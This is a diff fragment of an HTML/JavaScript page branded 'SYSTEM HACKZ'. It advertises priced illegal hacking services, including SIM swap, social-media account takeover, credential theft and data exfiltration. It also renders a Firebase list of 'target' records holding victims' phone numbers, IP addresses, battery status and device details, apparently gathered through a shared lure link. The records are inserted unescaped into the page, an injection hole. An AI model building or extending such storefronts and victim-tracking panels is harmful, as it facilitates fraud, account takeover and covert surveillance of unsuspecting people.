+  {name:"📁 𝐅𝐢𝐥𝐞 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹1,999"},
+  {name:"🔒 𝐄𝐧𝐜𝐫𝐲𝐩𝐭𝐢𝐨𝐧 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹2,499"},
+  {name:"📞 𝐒𝐈𝐌 𝐒𝐰𝐚𝐩 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹4,999"},
+  {name:"🎮 𝐆𝐚𝐦𝐞 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹1,999"},
+  {name:"🧠 𝐀𝐈 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹3,499"},
+  {name:"🤖 𝐁𝐨𝐭𝐧𝐞𝐭 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹3,999"},
+  {name:"🔗 𝐁𝐥𝐮𝐞𝐭𝐨𝐨𝐭𝐡 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹2,499"},
+  {name:"📸 𝐃𝐞𝐞𝐩𝐟𝐚𝐤𝐞 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹3,999"},
+  {name:"🎭 𝐅𝐚𝐜𝐞 𝐒𝐰𝐚𝐩 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹2,999"},
+  {name:"📊 𝐒𝐨𝐜𝐢𝐚𝐥 𝐌𝐞𝐝𝐢𝐚 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹2,499"},
+  {name:"📘 𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹2,999"},
+  {name:"📷 𝐈𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹2,999"},
+  {name:"💬 𝐒𝐧𝐚𝐩𝐜𝐡𝐚𝐭 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹2,499"},
+  {name:"📱 𝐌𝐨𝐛𝐢𝐥𝐞 𝐆𝐚𝐦𝐞 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹1,999"},
+  {name:"🖥️ 𝐕𝐏𝐒 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹2,499"},
+  {name:"☁️ 𝐒𝐞𝐫𝐯𝐞𝐫 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹3,499"},
+  {name:"🔐 𝐒𝐒𝐇 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹1,999"},
+  {name:"🗄️ 𝐒𝐐𝐋 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹2,499"},
+  {name:"⚡ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝 𝐈𝐧𝐣𝐞𝐜𝐭𝐢𝐨𝐧 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹2,999"},
+  {name:"🪟 𝐑𝐞𝐯𝐞𝐫𝐬𝐞 𝐒𝐡𝐞𝐥𝐥 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹2,499"},
+  {name:"📤 𝐃𝐚𝐭𝐚 𝐄𝐱𝐟𝐢𝐥𝐭𝐫𝐚𝐭𝐢𝐨𝐧 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹3,999"},
+  {name:"🔐 𝐂𝐫𝐞𝐝𝐞𝐧𝐭𝐢𝐚𝐥 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹2,499"},
+  {name:"🎯 𝐓𝐚𝐫𝐠𝐞𝐭𝐢𝐧𝐠 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹1,999"},
+  {name:"🔍 𝐎𝐒𝐈𝐍𝐓 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹1,499"},
+  {name:"🤖 𝐌𝐋 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹3,499"},
+  {name:"🧠 𝐃𝐞𝐞𝐩 𝐋𝐞𝐚𝐫𝐧𝐢𝐧𝐠 𝐇𝐚𝐜𝐤𝐢𝐧𝐠", price:"₹3,999"}
+];
+
+const toolsListEl = document.getElementById('toolsList');
+toolsList.forEach(tool => {
+  const div = document.createElement('div');
+  div.className = 'tool-item';
+  div.innerHTML = `<span class="tool-name">${tool.name}</span>`;
+  div.onclick = () => showBuyModal(tool.name, tool.price);
+  toolsListEl.appendChild(div);
+});
+
+/* ============ MENU ============ */
+function openMenu() {
+  document.getElementById('sideMenu').classList.add('open');
+  document.getElementById('overlay').classList.add('show');
+  document.body.style.overflow = 'hidden';
+}
+function closeMenu() {
+  document.getElementById('sideMenu').classList.remove('open');
+  document.getElementById('overlay').classList.remove('show');
+  document.body.style.overflow = '';
+  // Menu बंद करने के बाद scroll check करें
+  window.dispatchEvent(new Event('scroll'));
+}
+
+/* ============ BUY MODAL ============ */
+function showBuyModal(name, price) {
+  document.getElementById('buyToolName').textContent = name;
+  document.getElementById('buyToolPrice').innerHTML = price + '<small>ONE TIME PRICE</small>';
+  document.getElementById('buyModal').classList.add('show');
+}
+function closeBuyModal() {
+  document.getElementById('buyModal').classList.remove('show');
+}
+function showBuyInfo(name, price) {
+  showBuyModal(name, price);
+}
+function confirmBuy() {
+  const name = document.getElementById('buyToolName').textContent;
+  const price = document.getElementById('buyToolPrice').innerText.split('\n')[0];
+  closeBuyModal();
+  alert(`🔒 PREMIUM TOOL\n\n📦 Tool: ${name}\n💰 Price: ${price}\n\n👉 खरीदने के लिए ओनर से संपर्क करें।\n📞 Owner: SYSTEM\n\nSYSTEM HACKZ 💀`);
+}
+
+/* ============ HACKER POPUP ============ */
+let hackerPopupInterval;
+function showHackerPopup() {
+  const popup = document.getElementById('hackerPopup');
+  popup.style.display = 'flex';
+  setTimeout(() => { popup.style.display = 'none'; }, 3000);
+}
+function startHackerPopup() {
+  setTimeout(showHackerPopup, 800);
+  hackerPopupInterval = setInterval(showHackerPopup, 8000 + Math.random() * 4000);
+}
+
+/* ============ AUDIO ============ */
+document.addEventListener('DOMContentLoaded', function() {
+  const audio = document.getElementById('horrorSound');
+  const bgAudio = document.getElementById('backgroundSong');
+  if (bgAudio) {
+    bgAudio.volume = 0.4;
+    try { bgAudio.play().catch(e => {}); } catch (e) {}
+  }
+  if (audio) audio.volume = 0.3;
+  const playAudio = () => { try { if (audio) audio.play(); } catch (e) {} };
+  setTimeout(playAudio, 2000);
+  document.addEventListener('click', playAudio);
+  document.addEventListener('keydown', playAudio);
+  document.addEventListener('touchstart', playAudio);
+  startHackerPopup();
+});
+
+/* ============ COPY LINK ============ */
+function copyLink(){
+  navigator.clipboard.writeText("https://free-belance.onrender.com");
+  alert("Link copied!");
+}
+
+/* ============ FIREBASE ============ */
+db.ref("numbers").on("value", snap => {
+  const list = document.getElementById("list");
+  list.innerHTML = "";
+  if(!snap.exists()){
+    list.innerHTML = '<div style="color:#666;text-align:center;padding:20px">No data available</div>';
+    return;
+  }
+  const items = [];
+  snap.forEach(child => { items.push(child.val()); });
+  items.reverse();
+
+  items.forEach(data => {
+    const batteryEmoji = data.battery?.includes('Charging') ? '⚡' : '🔋';
+    const div = document.createElement('div');
+    div.className = 'data-box';
+    div.innerHTML = `
+      <div class="target-head">
+        <div class="num">${data.number}</div>
+        <div class="time">${data.time || 'N/A'}</div>
+      </div>
+      <div class="info-row">
+        <div class="info-label">🌐 IP:</div>
+        <div class="info-value">${data.ip || 'N/A'}</div>
+      </div>
+      <div class="info-row">
+        <div class="info-label">${batteryEmoji} Battery:</div>
+        <div class="info-value">${data.battery || 'N/A'}</div>
+      </div>
+      <div class="info-row">
+        <div class="info-label">📱 Device:</div>
+        <div class="info-value" title="${data.userAgent || ''}">${data.userAgent ? (data.userAgent.length > 50 ? data.userAgent.substring(0, 50) + '...' : data.userAgent) : 'N/A'}</div>
+      </div>
+      <button class="copy-btn" onclick="copyNumber('${data.number}')">📋 COPY NUMBER</button>
+    `;
+    list.appendChild(div);
+  });
+});
+
+function copyNumber(num) {
+  navigator.clipboard.writeText(num);
+  alert("Copied: " + num);
+}
+
+/* ============ MATRIX ============ */
+const c=document.getElementById("matrix"),x=c.getContext("2d");
+c.width=innerWidth;c.height=innerHeight;
+const cols=Math.floor(c.width/14),drops=Array(cols).fill(1);
+setInterval(()=>{
+  x.fillStyle="rgba(0,0,0,0.08)";
+  x.fillRect(0,0,c.width,c.height);
+  const themeColor = getComputedStyle(document.documentElement).getPropertyValue('--theme').trim() || '#00ff66';
+  x.fillStyle = themeColor;
+  x.font="14px monospace";
+  for(let i=0;i<drops.length;i++){
+    const t=String.fromCharCode(0x30A0+Math.random()*96);
+    x.fillText(t,i*14,drops[i]*14);
+    if(drops[i]*14>c.height && Math.random()>0.98) drops[i]=0;
+    drops[i]++;
+  }
+},33);
+
+window.addEventListener('beforeunload', function() {
+  if (hackerPopupInterval) clearInterval(hackerPopupInterval);
+});
+</script>
+
+</body>
+</html>
